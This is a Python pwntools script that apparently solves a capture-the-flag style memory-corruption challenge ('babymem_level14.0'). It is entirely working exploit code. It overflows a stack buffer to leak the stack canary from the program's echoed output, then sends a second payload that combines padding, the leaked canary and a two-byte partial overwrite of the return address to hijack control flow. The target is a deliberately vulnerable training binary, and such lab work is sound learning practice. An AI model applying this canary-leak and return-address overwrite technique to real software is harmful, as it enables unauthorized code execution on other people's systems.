from pwn import *
context.terminal = "bash"
p = process("/challenge/babymem_level14.0")
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'600')
print(p.recvuntil(b"bytes)!"))
win = b"A"*480
win += b"REPEAT"
win += b"A"*2
#win += pack(0x24ef)
#print(win)
sys.stdout.flush()
p.send(win)
#---------------------------------------------------
for j in range(90):
    print(j , " ",p.recvline())
print(p.recvuntil(b"said"))
canary = p.recvline()
print("HEEEEEEEEEEEEEEEEEEY AM HERE ->  ",canary)
#print(u64(canary))
for j in range(40):
    print(p.recvline())
print(p.recvuntil(b"size:"))
p.sendline(b'100')
win = b"A"*72
win += b'\x00'+canary
win += b"A"
win += b'\xef\x24'
print(win)
#p.sendline(b'\x00') #appending 0a
p.send(win)
#win = b"A"*8

for j in range(150):
    print(j , " ",p.recvline())

# 76  10 bytes read ---- 100
# 0x45239b59d705ce00 CANARY 



